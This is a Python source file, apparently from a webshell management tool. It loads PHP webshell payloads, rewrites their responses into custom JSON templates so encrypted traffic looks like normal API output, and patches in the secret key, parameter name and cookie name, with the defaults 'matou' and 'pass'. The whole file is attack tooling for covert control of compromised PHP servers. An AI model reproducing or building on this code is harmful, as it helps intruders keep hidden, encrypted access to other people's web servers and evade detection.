import os
import json
import re

class phpPayload:  
    def __init__(self):
        self.payload_dir = os.path.join(os.path.dirname(__file__), 'payload')

    def define_response_json(self, php_content, json_template):
        """
        根据用户自定义的JSON模板修改payload的响应格式
        
        :param php_content: PHP文件内容
        :param json_template: 自定义JSON模板字符串，例如：
                             '{"status":"success","encrypted_data":"${encrypted_data}","version":"1.0"}'
        :return: 修改后的PHP文件内容
        """
        if not json_template:
            return php_content
        
        try:
            # 解析JSON模板
            template_dict = json.loads(json_template)
            
            # 生成PHP数组代码（不包含基础缩进，稍后根据原始代码添加）
            php_array_lines = []
            php_array_lines.append("$response_json = array(")
            
            for key, value in template_dict.items():
                # 如果值是 ${encrypted_data}，则使用PHP变量 $encrypted_data
                if value == "${encrypted_data}":
                    php_array_lines.append(f"    '{key}' => $encrypted_data,")
                elif isinstance(value, str):
                    # 字符串值需要转义并加引号
                    escaped_value = value.replace("\\", "\\\\").replace("'", "\\'")
                    php_array_lines.append(f"    '{key}' => '{escaped_value}',")
                elif isinstance(value, bool):
                    # 布尔值转换为PHP的true/false
                    php_value = 'true' if value else 'false'
                    php_array_lines.append(f"    '{key}' => {php_value},")
                elif isinstance(value, (int, float)):
                    # 数字类型直接输出
                    php_array_lines.append(f"    '{key}' => {value},")
                elif value is None:
                    # null值转换为PHP的null
                    php_array_lines.append(f"    '{key}' => null,")
                else:
                    # 其他类型转换为字符串
                    escaped_value = str(value).replace("\\", "\\\\").replace("'", "\\'")
                    php_array_lines.append(f"    '{key}' => '{escaped_value}',")
            
            # 移除最后一个逗号
            if len(php_array_lines) > 1:
                php_array_lines[-1] = php_array_lines[-1].rstrip(',')
            
            php_array_lines.append(");")
            
            # 使用正则表达式查找并替换 $response_json 的定义
            # 匹配从 $response_json = array( 到对应的 ); 的内容（支持多行和嵌套括号）
            # 使用递归匹配来处理嵌套的括号（如 time() 函数调用）
            pattern = r'(\s*)(\$response_json\s*=\s*array\s*\((?:[^()]*|\([^()]*\))*\);)'
            
            def replace_response_json(match):
                indent = match.group(1)
                # 生成带正确缩进的PHP数组代码
                indented_lines = []
                for line in php_array_lines:
                    # 计算当前行的缩进级别
                    line_indent = len(line) - len(line.lstrip())
                    # 应用基础缩进
                    indented_line = indent + line
                    indented_lines.append(indented_line)
                php_array_code = "\n".join(indented_lines)
                return php_array_code
            
            # 执行替换
            modified_content = re.sub(pattern, replace_response_json, php_content, flags=re.DOTALL)
            
            if modified_content == php_content:
                print("[WARNING] 未找到 $response_json 变量定义，使用原始内容")
                return php_content
            
            print(f"[DEBUG] 已应用自定义JSON模板到payload")
            return modified_content
            
        except json.JSONDecodeError as e:
            print(f"[ERROR] JSON模板解析失败: {e}")
            return php_content
        except Exception as e:
            print(f"[ERROR] 应用JSON模板时出错: {e}")
            return php_content

    def apply_custom_json_template(self, php_content, json_template):
        """
        为xxx_json类型的payload应用自定义JSON模板
        
        :param php_content: php文件内容
        :param json_template: 自定义JSON模板字符串
        :return: 修改后的php文件内容
        """
        try:
            php_content = self.define_response_json(php_content, json_template)
            print(f"[DEBUG] 应用自定义JSON模板: {json_template}")
        except Exception as e:
            print(f"[WARNING] 无法从webshell配置获取JSON模板: {e}")
        return php_content    
    
    def patch_payload_keyAndParamName(self, php_content, secret_key, param_name,cookie_name):
        """
        修改php payload中的通信密钥和参数名，密钥变量为$secret_key，参数名变量为$pm
        
        :param php_content: PHP文件内容
        :param secret_key: 通信密钥（16字节字符串）
        :param param_name: 参数名（如 'pass'）
        :param cookie_name: cookie名称（如 'JSESSIONID'）
        :return: 修改后的PHP文件内容
        """
        if not secret_key or not param_name:
            print("[WARNING] secret_key 或 param_name 为空，使用原始payload")
            return php_content
        
        try:
            php_content = php_content.replace('$param$',param_name)
            php_content = php_content.replace('$secret_key$',secret_key)
            php_content = php_content.replace('$cookie_name$',cookie_name)
            return php_content
            
        except Exception as e:
            print(f"[ERROR] 修改payload参数时出错: {e}")
            return php_content
        

    def getPayload(self,payload_name,json_template=None,param_name=None,secret_key=None,cookie_name=None):
        """
        获取payload
        :param payload_name: payload名称
        :param json_template: 自定义JSON模板字符串
        :param param_name: 参数名（如果不提供，默认param_name=pass）
        :param secret_key: 通信密钥（如果不提供，默认secret_key=matou）
        :param cookie_name: cookie名称（如果不提供，默认cookie_name=JSESSIONID）
        :return: payload内容
        """
        payload_file = os.path.join(self.payload_dir, f"{payload_name}.php")
        with open(payload_file, 'r') as file:
            payload_content = file.read()
        if payload_content.startswith('<?php'):
            payload_content = payload_content[5:].lstrip()
        
        # 应用自定义JSON模板
        if "json" in payload_name.lower() and json_template:
            payload_content = self.apply_custom_json_template(payload_content,json_template)

        # 如果是mainPayload，需要修改通信参数
        if "mainPayload" in payload_name:  
            # 应用通信参数修改
            if param_name and secret_key:
                payload_content = self.patch_payload_keyAndParamName(payload_content, secret_key, param_name,cookie_name)
            else:
                print("[WARNING] param_name 或 secret_key 为空，默认param_name=pass, secret_key=matou")
                payload_content = self.patch_payload_keyAndParamName(payload_content, "matou", "pass",cookie_name)

        return payload_content
